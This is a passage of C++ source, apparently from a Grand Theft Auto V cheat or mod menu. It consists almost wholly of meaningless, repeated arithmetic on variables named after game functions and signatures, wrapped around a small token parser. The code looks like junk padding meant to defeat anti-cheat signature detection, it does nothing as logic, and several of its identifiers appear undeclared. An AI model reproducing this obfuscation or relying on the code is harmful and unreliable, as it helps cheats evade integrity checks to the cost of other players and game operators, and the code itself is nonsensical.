						matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						if (matriz[1] > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						a = 0.0f;
						b = 0.0f;
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (5) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						a = 0.0f;
						b = 0.0f;
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						tokens.push_back(b);
					}
					else if (Extern_Reader::StringManager::SeContemTexto(token, "<Roll>"))
					{
					if (offset > aaaaaa)
					{
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
						matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
						offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (matriz[3] + (5)) / (2 * matriz[2]);
					aaaaaa = ponteiro * 2;
					a = 0.0f;
					a1 = (matriz[3] + (4)) / (2 * matriz[2]);
					b = 0.0f;
					matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
					matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					matriz[4] = matriz[1];
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (matriz[4] + (3)) / (2 * matriz[2]);
					a2 = (matriz[4] + (2)) / (2 * matriz[2]);
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > aaaaaa)
					{
					}
					else
						a1 = (matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (matriz[4] - (3)) / (2 * matriz[2]);

					if (matriz[1] > aaaaaa)
					{
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
					}
					else
					{
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					}
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
					a = 0.0f;
					b = 0.0f;
					if (matriz[4] > 50.0f)
					{
						matriz[4] = matriz[1];
					}
					a2 = (matriz[4]) / (2 * matriz[2]);
					a1 = (matriz[3] + (2)) / (2 * matriz[2]);
